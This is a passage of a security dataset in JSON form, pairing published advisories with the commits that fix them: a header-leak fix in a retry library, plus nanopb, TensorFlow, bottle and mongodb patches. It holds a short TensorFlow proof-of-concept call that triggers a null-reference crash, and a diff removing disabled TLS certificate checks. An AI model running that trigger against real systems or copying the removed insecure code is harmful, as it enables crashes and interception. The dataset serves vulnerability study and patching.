            "patch_content":"From 0979c6001d9d57c2aac3157c11b007397158922a Mon Sep 17 00:00:00 2001\nFrom: Timothee Desurmont <40275437+Sampaguitas@users.noreply.github.com>\nDate: Wed, 16 Feb 2022 00:20:12 +0400\nSubject: [PATCH] Prevent Cookie & Authorization Headers from being forwarded\n when the URL redirects to another domain (information leak) #137\n\n---\n index.js | 40 +++++++++++++++++++++++++++++++++++++++-\n 1 file changed, 39 insertions(+), 1 deletion(-)\n\ndiff --git a\/index.js b\/index.js\nindex 497d83d..9d9685b 100644\n--- a\/index.js\n+++ b\/index.js\n@@ -11,6 +11,8 @@ var extend = require('extend');\n var request = require('request');\n var RetryStrategies = require('.\/strategies');\n var _ = require('lodash');\n+var url = require('url');\n+var querystring = require(\"querystring\");\n \n var DEFAULTS = {\n   maxAttempts: 5, \/\/ try 5 times\n@@ -24,6 +26,42 @@ function defaultPromiseFactory(resolver) {\n   return new Promise(resolver);\n }\n \n+\/\/ Prevent Cookie & Authorization Headers from being forwarded \n+\/\/ when the URL redirects to another domain (information leak) #137 \n+function sanitizeHeaders(options) {\n+  \n+  const HEADERS_TO_IGNORE = [\"cookie\", \"authorization\"];\n+\n+  const urlObject = url.parse(options.url)\n+  const queryObject = querystring.parse(urlObject.query);\n+  \n+  const hasExternalLink = Object.keys(queryObject).reduce(function(acc, cur) {\n+    \n+    let qUrl = url.parse(queryObject[cur]);\n+\n+    \/\/ external link if protocol || host || port is different\n+    if(!!qUrl.host && (qUrl.protocol !== urlObject.protocol || qUrl.host !== urlObject.host || qUrl.port !== urlObject.port) ) {\n+      acc = true;\n+    }\n+    \n+    return acc;\n+\n+  }, false);\n+\n+  if (hasExternalLink && options.hasOwnProperty(\"headers\") && typeof(options.headers) === \"object\") {\n+    \n+    \/\/ if External Link: remove Cookie and Authorization from Headers\n+    Object.keys(options.headers).filter(function(key) {\n+      return HEADERS_TO_IGNORE.includes(key.toLowerCase())\n+    }).map(function(key) {\n+      return delete options.headers[key]\n+    });\n+\n+  }\n+\n+  return options;\n+}\n+\n function _cloneOptions(options) {\n   const cloned = {};\n   for (let key in options) {\n@@ -85,7 +123,7 @@ function Request(url, options, f, retryConfig) {\n    * Option object\n    * @type {Object}\n    *\/\n-  this.options = options;\n+  this.options = sanitizeHeaders(options);\n \n   \/**\n    * Return true if the request should be retried",
            "code_diff":"@@ -11,6 +11,8 @@ var extend = require('extend');\n var request = require('request');\n var RetryStrategies = require('.\/strategies');\n var _ = require('lodash');\n+var url = require('url');\n+var querystring = require(\"querystring\");\n \n var DEFAULTS = {\n   maxAttempts: 5, \/\/ try 5 times\n@@ -24,6 +26,42 @@ function defaultPromiseFactory(resolver) {\n   return new Promise(resolver);\n }\n \n+\/\/ Prevent Cookie & Authorization Headers from being forwarded \n+\/\/ when the URL redirects to another domain (information leak) #137 \n+function sanitizeHeaders(options) {\n+  \n+  const HEADERS_TO_IGNORE = [\"cookie\", \"authorization\"];\n+\n+  const urlObject = url.parse(options.url)\n+  const queryObject = querystring.parse(urlObject.query);\n+  \n+  const hasExternalLink = Object.keys(queryObject).reduce(function(acc, cur) {\n+    \n+    let qUrl = url.parse(queryObject[cur]);\n+\n+    \/\/ external link if protocol || host || port is different\n+    if(!!qUrl.host && (qUrl.protocol !== urlObject.protocol || qUrl.host !== urlObject.host || qUrl.port !== urlObject.port) ) {\n+      acc = true;\n+    }\n+    \n+    return acc;\n+\n+  }, false);\n+\n+  if (hasExternalLink && options.hasOwnProperty(\"headers\") && typeof(options.headers) === \"object\") {\n+    \n+    \/\/ if External Link: remove Cookie and Authorization from Headers\n+    Object.keys(options.headers).filter(function(key) {\n+      return HEADERS_TO_IGNORE.includes(key.toLowerCase())\n+    }).map(function(key) {\n+      return delete options.headers[key]\n+    });\n+\n+  }\n+\n+  return options;\n+}\n+\n function _cloneOptions(options) {\n   const cloned = {};\n   for (let key in options) {\n@@ -85,7 +123,7 @@ function Request(url, options, f, retryConfig) {\n    * Option object\n    * @type {Object}\n    *\/\n-  this.options = options;\n+  this.options = sanitizeHeaders(options);\n \n   \/**\n    * Return true if the request should be retried"
        },
        {
            "index":718,
            "vuln_id":"GHSA-85rr-4rh9-hhwh",
            "cwe_id":"{'CWE-119', 'CWE-20'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/nanopb\/nanopb\/commit\/4fe23595732b6f1254cfc11a9b8d6da900b55b0c'}",
            "dataset":"osv",
            "summary":"Memory leak in Nanopb ### Impact\nDecoding specifically formed message can leak memory if dynamic allocation is enabled and an oneof field contains a static submessage that contains a dynamic field, and the message being decoded contains the submessage multiple times. This is rare in normal messages, but it is a concern when untrusted data is parsed.\n\n### Patches\nPreliminary patch is [available on git](https:\/\/github.com\/nanopb\/nanopb\/commit\/edf6dcbffee4d614ac0c2c1b258ab95185bdb6e9) and problem will be patched in versions 0.3.9.7 and 0.4.4 once testing has been completed.\n\n### Workarounds\nFollowing workarounds are available:\n* Set the option `no_unions` for the oneof field. This will generate fields as separate instead of C union, and avoids triggering the problematic code.\n* Set the type of the submessage field inside oneof to `FT_POINTER`. This way the whole submessage will be dynamically allocated and the problematic code is not executed.\n* Use an arena allocator for nanopb, to make sure all memory can be released afterwards.\n\n### References\nBug report: https:\/\/github.com\/nanopb\/nanopb\/issues\/615\n\n### For more information\nIf you have any questions or comments about this advisory, comment on the bug report linked above.",
            "published_date":"2020-11-25",
            "chain_len":1,
            "project":"https:\/\/github.com\/nanopb\/nanopb",
            "commit_href":"https:\/\/github.com\/nanopb\/nanopb\/commit\/4fe23595732b6f1254cfc11a9b8d6da900b55b0c",
            "commit_sha":"4fe23595732b6f1254cfc11a9b8d6da900b55b0c",
            "patch":"SINGLE",
            "chain_ord":"['4fe23595732b6f1254cfc11a9b8d6da900b55b0c']",
            "before_first_fix_commit":"{'d9d5dfd869aca4d00a81f671b2445fb4cea0352f'}",
            "last_fix_commit":"4fe23595732b6f1254cfc11a9b8d6da900b55b0c",
            "chain_ord_pos":1.0,
            "commit_datetime":"11\/25\/2020, 09:38:40",
            "message":"Fix memory leak with oneofs and PB_ENABLE_MALLOC (#615)\n\nNanopb would leak memory when all of the following conditions were true:\n- PB_ENABLE_MALLOC is defined at the compile time\n- Message definitions contains an oneof field,\n  the oneof contains a static submessage, and\n  the static submessage contains a pointer field.\n- Data being decoded contains two values for the submessage.\n\nThe logic in pb_release_union_field would detect that the same\nsubmessage occurs twice, and wouldn't release it because keeping\nthe old values is necessary to match the C++ library behavior\nregarding message merges.\n\nBut then decode_static_field() would go to memset() the whole\nsubmessage to zero, because it unconditionally assumed it to\nbe uninitialized memory. This would normally happen when the\ncontents of the union field is switched to a different oneof\nitem, instead of merging with the same one.\n\nThis commit changes it so that the field is memset() only when\n`which_field` contains a different tag.",
            "author":"Petteri Aimonen",
            "comments":null,
            "stats":"{'additions': 6, 'deletions': 3, 'total': 9}",
            "files":"{'pb_decode.c': {'additions': 6, 'deletions': 3, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nanopb\/nanopb\/raw\/4fe23595732b6f1254cfc11a9b8d6da900b55b0c\/pb_decode.c', 'patch': '@@ -464,14 +464,17 @@ static bool checkreturn decode_static_field(pb_istream_t *stream, pb_wire_type_t\\n             }\\n \\n         case PB_HTYPE_ONEOF:\\n-            *(pb_size_t*)iter->pSize = iter->pos->tag;\\n-            if (PB_LTYPE(type) == PB_LTYPE_SUBMESSAGE)\\n+            if (PB_LTYPE(type) == PB_LTYPE_SUBMESSAGE &&\\n+                *(pb_size_t*)iter->pSize != iter->pos->tag)\\n             {\\n                 \/* We memset to zero so that any callbacks are set to NULL.\\n-                 * Then set any default values. *\/\\n+                 * This is because the callbacks might otherwise have values\\n+                 * from some other union field. *\/\\n                 memset(iter->pData, 0, iter->pos->data_size);\\n                 pb_message_set_to_defaults((const pb_field_t*)iter->pos->ptr, iter->pData);\\n             }\\n+            *(pb_size_t*)iter->pSize = iter->pos->tag;\\n+\\n             return func(stream, iter->pos, iter->pData);\\n \\n         default:'}}",
            "message_norm":"fix memory leak with oneofs and pb_enable_malloc (#615)\n\nnanopb would leak memory when all of the following conditions were true:\n- pb_enable_malloc is defined at the compile time\n- message definitions contains an oneof field,\n  the oneof contains a static submessage, and\n  the static submessage contains a pointer field.\n- data being decoded contains two values for the submessage.\n\nthe logic in pb_release_union_field would detect that the same\nsubmessage occurs twice, and wouldn't release it because keeping\nthe old values is necessary to match the c++ library behavior\nregarding message merges.\n\nbut then decode_static_field() would go to memset() the whole\nsubmessage to zero, because it unconditionally assumed it to\nbe uninitialized memory. this would normally happen when the\ncontents of the union field is switched to a different oneof\nitem, instead of merging with the same one.\n\nthis commit changes it so that the field is memset() only when\n`which_field` contains a different tag.",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('memory leak', 'SECWORD', ''), ('#615', 'ISSUE', ''), ('leak', 'SECWORD', ''), ('decoded', 'SECWORD', ''), ('decode_static_field', 'SECWORD', ''), ('uninitialized memory', 'SECWORD', ''), ('changes', 'ACTION', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['pb_decode.c'])",
            "num_files":1.0,
            "patch_content":"From 4fe23595732b6f1254cfc11a9b8d6da900b55b0c Mon Sep 17 00:00:00 2001\nFrom: Petteri Aimonen <jpa@git.mail.kapsi.fi>\nDate: Wed, 25 Nov 2020 11:38:40 +0200\nSubject: [PATCH] Fix memory leak with oneofs and PB_ENABLE_MALLOC (#615)\n\nNanopb would leak memory when all of the following conditions were true:\n- PB_ENABLE_MALLOC is defined at the compile time\n- Message definitions contains an oneof field,\n  the oneof contains a static submessage, and\n  the static submessage contains a pointer field.\n- Data being decoded contains two values for the submessage.\n\nThe logic in pb_release_union_field would detect that the same\nsubmessage occurs twice, and wouldn't release it because keeping\nthe old values is necessary to match the C++ library behavior\nregarding message merges.\n\nBut then decode_static_field() would go to memset() the whole\nsubmessage to zero, because it unconditionally assumed it to\nbe uninitialized memory. This would normally happen when the\ncontents of the union field is switched to a different oneof\nitem, instead of merging with the same one.\n\nThis commit changes it so that the field is memset() only when\n`which_field` contains a different tag.\n---\n pb_decode.c | 9 ++++++---\n 1 file changed, 6 insertions(+), 3 deletions(-)\n\ndiff --git a\/pb_decode.c b\/pb_decode.c\nindex ce5c4ae9..3f14a391 100644\n--- a\/pb_decode.c\n+++ b\/pb_decode.c\n@@ -464,14 +464,17 @@ static bool checkreturn decode_static_field(pb_istream_t *stream, pb_wire_type_t\n             }\n \n         case PB_HTYPE_ONEOF:\n-            *(pb_size_t*)iter->pSize = iter->pos->tag;\n-            if (PB_LTYPE(type) == PB_LTYPE_SUBMESSAGE)\n+            if (PB_LTYPE(type) == PB_LTYPE_SUBMESSAGE &&\n+                *(pb_size_t*)iter->pSize != iter->pos->tag)\n             {\n                 \/* We memset to zero so that any callbacks are set to NULL.\n-                 * Then set any default values. *\/\n+                 * This is because the callbacks might otherwise have values\n+                 * from some other union field. *\/\n                 memset(iter->pData, 0, iter->pos->data_size);\n                 pb_message_set_to_defaults((const pb_field_t*)iter->pos->ptr, iter->pData);\n             }\n+            *(pb_size_t*)iter->pSize = iter->pos->tag;\n+\n             return func(stream, iter->pos, iter->pData);\n \n         default:",
            "code_diff":"@@ -464,14 +464,17 @@ static bool checkreturn decode_static_field(pb_istream_t *stream, pb_wire_type_t\n             }\n \n         case PB_HTYPE_ONEOF:\n-            *(pb_size_t*)iter->pSize = iter->pos->tag;\n-            if (PB_LTYPE(type) == PB_LTYPE_SUBMESSAGE)\n+            if (PB_LTYPE(type) == PB_LTYPE_SUBMESSAGE &&\n+                *(pb_size_t*)iter->pSize != iter->pos->tag)\n             {\n                 \/* We memset to zero so that any callbacks are set to NULL.\n-                 * Then set any default values. *\/\n+                 * This is because the callbacks might otherwise have values\n+                 * from some other union field. *\/\n                 memset(iter->pData, 0, iter->pos->data_size);\n                 pb_message_set_to_defaults((const pb_field_t*)iter->pos->ptr, iter->pData);\n             }\n+            *(pb_size_t*)iter->pSize = iter->pos->tag;\n+\n             return func(stream, iter->pos, iter->pData);\n \n         default:"
        },
        {
            "index":434,
            "vuln_id":"GHSA-qr82-2c78-4m8h",
            "cwe_id":"{'CWE-824'}",
            "score":7.8,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/532f5c5a547126c634fefd43bbad1dc6417678ac'}",
            "dataset":"osv",
            "summary":"Reference binding to nullptr in map operations ### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.Map*` and `tf.raw_ops.OrderedMap*` operations:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.MapPeek(\n  key=tf.constant([8],dtype=tf.int64),\n  indices=[],\n  dtypes=[tf.int32],\n  capacity=8,\n  memory_limit=128)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/kernels\/map_stage_op.cc#L222-L248) has a check in place to ensure that `indices` is in ascending order, but does not check that `indices` is not empty.\n    \n### Patches\nWe have patched the issue in GitHub commit [532f5c5a547126c634fefd43bbad1dc6417678ac](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/532f5c5a547126c634fefd43bbad1dc6417678ac).\n                       \nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
            "published_date":"2021-08-25",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/532f5c5a547126c634fefd43bbad1dc6417678ac",
            "commit_sha":"532f5c5a547126c634fefd43bbad1dc6417678ac",
            "patch":"SINGLE",
            "chain_ord":"['532f5c5a547126c634fefd43bbad1dc6417678ac']",
            "before_first_fix_commit":"{'a4e138660270e7599793fa438cd7b2fc2ce215a6'}",
            "last_fix_commit":"532f5c5a547126c634fefd43bbad1dc6417678ac",
            "chain_ord_pos":1.0,
            "commit_datetime":"07\/30\/2021, 05:24:39",
            "message":"Prevent nullptr deref in validation of indexes in map ops.\n\nPiperOrigin-RevId: 387738023\nChange-Id: I83d18d36a7b82ffd2a40b5124a4e5b4c72238f27",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 9, 'deletions': 6, 'total': 15}",
            "files":"{'tensorflow\/core\/kernels\/map_stage_op.cc': {'additions': 9, 'deletions': 6, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/532f5c5a547126c634fefd43bbad1dc6417678ac\/tensorflow%2Fcore%2Fkernels%2Fmap_stage_op.cc', 'patch': '@@ -210,25 +210,28 @@ class StagingMap : public ResourceBase {\\n                                    const OptionalTuple& tuple)\\n       TF_EXCLUSIVE_LOCKS_REQUIRED(mu_) {\\n     if (tuple[index].has_value()) {\\n-      return Status(errors::InvalidArgument(\\n+      return errors::InvalidArgument(\\n           \"The tensor for index \\'\", index, \"\\' for key \\'\", key.scalar<int64>()(),\\n-          \"\\' was already initialized \\'\", dtypes_.size(), \"\\'.\"));\\n+          \"\\' was already initialized \\'\", dtypes_.size(), \"\\'.\");\\n     }\\n \\n     return Status::OK();\\n   }\\n \\n   \/\/ Check that the indices are strictly ordered\\n   Status check_index_ordering(const Tensor& indices) {\\n+    if (indices.NumElements() == 0) {\\n+      return errors::InvalidArgument(\"Indices are empty\");\\n+    }\\n+\\n     auto findices = indices.flat<int>();\\n \\n     for (std::size_t i = 0; i < findices.dimension(0) - 1; ++i) {\\n       if (findices(i) < findices(i + 1)) {\\n         continue;\\n       }\\n \\n-      return Status(\\n-          errors::InvalidArgument(\"Indices are not strictly ordered\"));\\n+      return errors::InvalidArgument(\"Indices are not strictly ordered\");\\n     }\\n \\n     return Status::OK();\\n@@ -238,10 +241,10 @@ class StagingMap : public ResourceBase {\\n   Status check_memory_limit(std::size_t bytes)\\n       TF_EXCLUSIVE_LOCKS_REQUIRED(mu_) {\\n     if (has_memory_limit() && bytes > memory_limit_) {\\n-      return Status(errors::ResourceExhausted(\\n+      return errors::ResourceExhausted(\\n           \"Attempted to insert tensors with combined size of \\'\", bytes,\\n           \"\\' bytes into Staging Area with a memory limit of \\'\", memory_limit_,\\n-          \"\\'.\"));\\n+          \"\\'.\");\\n     }\\n \\n     return Status::OK();'}}",
            "message_norm":"prevent nullptr deref in validation of indexes in map ops.\n\npiperorigin-revid: 387738023\nchange-id: i83d18d36a7b82ffd2a40b5124a4e5b4c72238f27",
            "language":"en",
            "entities":"[('prevent', 'ACTION', ''), ('nullptr', 'SECWORD', ''), ('387738023', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/kernels\/map_stage_op.cc'])",
            "num_files":1.0,
            "patch_content":"From 532f5c5a547126c634fefd43bbad1dc6417678ac Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Thu, 29 Jul 2021 22:24:39 -0700\nSubject: [PATCH] Prevent nullptr deref in validation of indexes in map ops.\n\nPiperOrigin-RevId: 387738023\nChange-Id: I83d18d36a7b82ffd2a40b5124a4e5b4c72238f27\n---\n tensorflow\/core\/kernels\/map_stage_op.cc | 15 +++++++++------\n 1 file changed, 9 insertions(+), 6 deletions(-)\n\ndiff --git a\/tensorflow\/core\/kernels\/map_stage_op.cc b\/tensorflow\/core\/kernels\/map_stage_op.cc\nindex 9411792762baab..1a2f5a8fa2247d 100644\n--- a\/tensorflow\/core\/kernels\/map_stage_op.cc\n+++ b\/tensorflow\/core\/kernels\/map_stage_op.cc\n@@ -210,9 +210,9 @@ class StagingMap : public ResourceBase {\n                                    const OptionalTuple& tuple)\n       TF_EXCLUSIVE_LOCKS_REQUIRED(mu_) {\n     if (tuple[index].has_value()) {\n-      return Status(errors::InvalidArgument(\n+      return errors::InvalidArgument(\n           \"The tensor for index '\", index, \"' for key '\", key.scalar<int64>()(),\n-          \"' was already initialized '\", dtypes_.size(), \"'.\"));\n+          \"' was already initialized '\", dtypes_.size(), \"'.\");\n     }\n \n     return Status::OK();\n@@ -220,6 +220,10 @@ class StagingMap : public ResourceBase {\n \n   \/\/ Check that the indices are strictly ordered\n   Status check_index_ordering(const Tensor& indices) {\n+    if (indices.NumElements() == 0) {\n+      return errors::InvalidArgument(\"Indices are empty\");\n+    }\n+\n     auto findices = indices.flat<int>();\n \n     for (std::size_t i = 0; i < findices.dimension(0) - 1; ++i) {\n@@ -227,8 +231,7 @@ class StagingMap : public ResourceBase {\n         continue;\n       }\n \n-      return Status(\n-          errors::InvalidArgument(\"Indices are not strictly ordered\"));\n+      return errors::InvalidArgument(\"Indices are not strictly ordered\");\n     }\n \n     return Status::OK();\n@@ -238,10 +241,10 @@ class StagingMap : public ResourceBase {\n   Status check_memory_limit(std::size_t bytes)\n       TF_EXCLUSIVE_LOCKS_REQUIRED(mu_) {\n     if (has_memory_limit() && bytes > memory_limit_) {\n-      return Status(errors::ResourceExhausted(\n+      return errors::ResourceExhausted(\n           \"Attempted to insert tensors with combined size of '\", bytes,\n           \"' bytes into Staging Area with a memory limit of '\", memory_limit_,\n-          \"'.\"));\n+          \"'.\");\n     }\n \n     return Status::OK();",
            "code_diff":"@@ -210,9 +210,9 @@ class StagingMap : public ResourceBase {\n                                    const OptionalTuple& tuple)\n       TF_EXCLUSIVE_LOCKS_REQUIRED(mu_) {\n     if (tuple[index].has_value()) {\n-      return Status(errors::InvalidArgument(\n+      return errors::InvalidArgument(\n           \"The tensor for index '\", index, \"' for key '\", key.scalar<int64>()(),\n-          \"' was already initialized '\", dtypes_.size(), \"'.\"));\n+          \"' was already initialized '\", dtypes_.size(), \"'.\");\n     }\n \n     return Status::OK();\n@@ -220,6 +220,10 @@ class StagingMap : public ResourceBase {\n \n   \/\/ Check that the indices are strictly ordered\n   Status check_index_ordering(const Tensor& indices) {\n+    if (indices.NumElements() == 0) {\n+      return errors::InvalidArgument(\"Indices are empty\");\n+    }\n+\n     auto findices = indices.flat<int>();\n \n     for (std::size_t i = 0; i < findices.dimension(0) - 1; ++i) {\n@@ -227,8 +231,7 @@ class StagingMap : public ResourceBase {\n         continue;\n       }\n \n-      return Status(\n-          errors::InvalidArgument(\"Indices are not strictly ordered\"));\n+      return errors::InvalidArgument(\"Indices are not strictly ordered\");\n     }\n \n     return Status::OK();\n@@ -238,10 +241,10 @@ class StagingMap : public ResourceBase {\n   Status check_memory_limit(std::size_t bytes)\n       TF_EXCLUSIVE_LOCKS_REQUIRED(mu_) {\n     if (has_memory_limit() && bytes > memory_limit_) {\n-      return Status(errors::ResourceExhausted(\n+      return errors::ResourceExhausted(\n           \"Attempted to insert tensors with combined size of '\", bytes,\n           \"' bytes into Staging Area with a memory limit of '\", memory_limit_,\n-          \"'.\"));\n+          \"'.\");\n     }\n \n     return Status::OK();"
        },
        {
            "index":469,
            "vuln_id":"GHSA-xhp9-4947-rq78",
            "cwe_id":"{'CWE-755'}",
            "score":9.8,
            "chain":"{'https:\/\/github.com\/bottlepy\/bottle\/commit\/a2b0ee6bb4ce88895429ec4aca856616244c4c4c', 'https:\/\/github.com\/bottlepy\/bottle\/commit\/e140e1b54da721a660f2eb9d58a106b7b3ff2f00'}",
            "dataset":"osv",
            "summary":"Denial of service in bottle Bottle before 0.12.20 mishandles errors during early request binding.",
            "published_date":"2022-06-03",
            "chain_len":2,
            "project":"https:\/\/github.com\/bottlepy\/bottle",
            "commit_href":"https:\/\/github.com\/bottlepy\/bottle\/commit\/e140e1b54da721a660f2eb9d58a106b7b3ff2f00",
            "commit_sha":"e140e1b54da721a660f2eb9d58a106b7b3ff2f00",
            "patch":"MULTI",
            "chain_ord":"['e140e1b54da721a660f2eb9d58a106b7b3ff2f00', 'a2b0ee6bb4ce88895429ec4aca856616244c4c4c']",
            "before_first_fix_commit":"{'04b27f185412250f9389a6a14d1e1c516c87e13c'}",
            "last_fix_commit":"a2b0ee6bb4ce88895429ec4aca856616244c4c4c",
            "chain_ord_pos":1.0,
            "commit_datetime":"05\/26\/2022, 12:49:32",
            "message":"Gracefully handle errors during early request binding.",
            "author":"Marcel Hellkamp",
            "comments":null,
            "stats":"{'additions': 9, 'deletions': 7, 'total': 16}",
            "files":"{'bottle.py': {'additions': 9, 'deletions': 7, 'changes': 16, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/bottlepy\/bottle\/raw\/e140e1b54da721a660f2eb9d58a106b7b3ff2f00\/bottle.py', 'patch': \"@@ -848,17 +848,19 @@ def default_error_handler(self, res):\\n         return tob(template(ERROR_PAGE_TEMPLATE, e=res))\\n \\n     def _handle(self, environ):\\n-        path = environ['bottle.raw_path'] = environ['PATH_INFO']\\n-        if py3k:\\n-            try:\\n-                environ['PATH_INFO'] = path.encode('latin1').decode('utf8')\\n-            except UnicodeError:\\n-                return HTTPError(400, 'Invalid path string. Expected UTF-8')\\n-\\n         try:\\n+\\n             environ['bottle.app'] = self\\n             request.bind(environ)\\n             response.bind()\\n+\\n+            path = environ['bottle.raw_path'] = environ['PATH_INFO']\\n+            if py3k:\\n+                try:\\n+                    environ['PATH_INFO'] = path.encode('latin1').decode('utf8')\\n+                except UnicodeError:\\n+                    return HTTPError(400, 'Invalid path string. Expected UTF-8')\\n+\\n             try:\\n                 self.trigger_hook('before_request')\\n                 route, args = self.router.match(environ)\"}}",
            "message_norm":"gracefully handle errors during early request binding.",
            "language":"en",
            "entities":"[('errors', 'FLAW', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['bottle.py'])",
            "num_files":1.0,
            "patch_content":"From e140e1b54da721a660f2eb9d58a106b7b3ff2f00 Mon Sep 17 00:00:00 2001\nFrom: Marcel Hellkamp <marc@gsites.de>\nDate: Thu, 26 May 2022 14:49:32 +0200\nSubject: [PATCH] Gracefully handle errors during early request binding.\n\n---\n bottle.py | 16 +++++++++-------\n 1 file changed, 9 insertions(+), 7 deletions(-)\n\ndiff --git a\/bottle.py b\/bottle.py\nindex 04ccf7da..035f99ec 100644\n--- a\/bottle.py\n+++ b\/bottle.py\n@@ -848,17 +848,19 @@ def default_error_handler(self, res):\n         return tob(template(ERROR_PAGE_TEMPLATE, e=res))\n \n     def _handle(self, environ):\n-        path = environ['bottle.raw_path'] = environ['PATH_INFO']\n-        if py3k:\n-            try:\n-                environ['PATH_INFO'] = path.encode('latin1').decode('utf8')\n-            except UnicodeError:\n-                return HTTPError(400, 'Invalid path string. Expected UTF-8')\n-\n         try:\n+\n             environ['bottle.app'] = self\n             request.bind(environ)\n             response.bind()\n+\n+            path = environ['bottle.raw_path'] = environ['PATH_INFO']\n+            if py3k:\n+                try:\n+                    environ['PATH_INFO'] = path.encode('latin1').decode('utf8')\n+                except UnicodeError:\n+                    return HTTPError(400, 'Invalid path string. Expected UTF-8')\n+\n             try:\n                 self.trigger_hook('before_request')\n                 route, args = self.router.match(environ)",
            "code_diff":"@@ -848,17 +848,19 @@ def default_error_handler(self, res):\n         return tob(template(ERROR_PAGE_TEMPLATE, e=res))\n \n     def _handle(self, environ):\n-        path = environ['bottle.raw_path'] = environ['PATH_INFO']\n-        if py3k:\n-            try:\n-                environ['PATH_INFO'] = path.encode('latin1').decode('utf8')\n-            except UnicodeError:\n-                return HTTPError(400, 'Invalid path string. Expected UTF-8')\n-\n         try:\n+\n             environ['bottle.app'] = self\n             request.bind(environ)\n             response.bind()\n+\n+            path = environ['bottle.raw_path'] = environ['PATH_INFO']\n+            if py3k:\n+                try:\n+                    environ['PATH_INFO'] = path.encode('latin1').decode('utf8')\n+                except UnicodeError:\n+                    return HTTPError(400, 'Invalid path string. Expected UTF-8')\n+\n             try:\n                 self.trigger_hook('before_request')\n                 route, args = self.router.match(environ)"
        },
        {
            "index":844,
            "vuln_id":"GHSA-rjmf-p882-645m",
            "cwe_id":"{'CWE-295'}",
            "score":6.8,
            "chain":"{'https:\/\/github.com\/mongodb\/libmongocrypt\/commit\/76365515ff8754b9f705e56428dd0d7efa7f541b'}",
            "dataset":"osv",
            "summary":"Improper Certificate Validation A specific version of the Node.js mongodb-client-encryption module does not perform correct validation of the KMS server\u2019s certificate. This vulnerability in combination with a privileged network position active MITM attack could result in interception of traffic between the Node.js driver and the KMS service rendering client-side field level encryption (CSFLE) ineffective. This issue was discovered during internal testing and affects mongodb-client-encryption module version 1.2.0, which was available from 2021-Jan-29 and deprecated in the NPM Registry on 2021-Feb-04. This vulnerability does not impact driver traffic payloads with CSFLE-supported key services from applications residing inside the AWS, GCP, and Azure nework fabrics due to compensating controls in these environments. This issue does not impact driver workloads that don\u2019t use Field Level Encryption.",
            "published_date":"2021-04-12",
            "chain_len":1,
            "project":"https:\/\/github.com\/mongodb\/libmongocrypt",
            "commit_href":"https:\/\/github.com\/mongodb\/libmongocrypt\/commit\/76365515ff8754b9f705e56428dd0d7efa7f541b",
            "commit_sha":"76365515ff8754b9f705e56428dd0d7efa7f541b",
            "patch":"SINGLE",
            "chain_ord":"['76365515ff8754b9f705e56428dd0d7efa7f541b']",
            "before_first_fix_commit":"{'30d8adc205bffcc9764e4e556a25146687183751'}",
            "last_fix_commit":"76365515ff8754b9f705e56428dd0d7efa7f541b",
            "chain_ord_pos":1.0,
            "commit_datetime":"02\/05\/2021, 23:37:36",
            "message":"fix: always authorize TLS endpoints, use servername for SNI (#159)\n\nTLS endpoints should always be authorized. \r\nIn order to properly communicate with GCP's KMS servers\r\nwe need to provide a `servername`, so the endpoint can serve the\r\ncorrect TLS certificate.",
            "author":"Matt Broadstone",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'bindings\/node\/lib\/stateMachine.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mongodb\/libmongocrypt\/raw\/76365515ff8754b9f705e56428dd0d7efa7f541b\/bindings%2Fnode%2Flib%2FstateMachine.js', 'patch': \"@@ -217,7 +217,7 @@ module.exports = function(modules) {\\n     kmsRequest(request) {\\n       const parsedUrl = request.endpoint.split(':');\\n       const port = parsedUrl[1] != null ? Number.parseInt(parsedUrl[1], 10) : HTTPS_PORT;\\n-      const options = { host: parsedUrl[0], port, rejectUnauthorized: false };\\n+      const options = { host: parsedUrl[0], servername: parsedUrl[0], port };\\n       const message = request.message;\\n \\n       return new Promise((resolve, reject) => {\"}}",
            "message_norm":"fix: always authorize tls endpoints, use servername for sni (#159)\n\ntls endpoints should always be authorized. \r\nin order to properly communicate with gcp's kms servers\r\nwe need to provide a `servername`, so the endpoint can serve the\r\ncorrect tls certificate.",
            "language":"en",
            "entities":"[('tls', 'SECWORD', ''), ('servername', 'SECWORD', ''), ('#159', 'ISSUE', ''), ('tls', 'SECWORD', ''), ('servers', 'SECWORD', ''), ('servername', 'SECWORD', ''), ('tls', 'SECWORD', ''), ('certificate', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['bindings\/node\/lib\/stateMachine.js'])",
            "num_files":1.0,
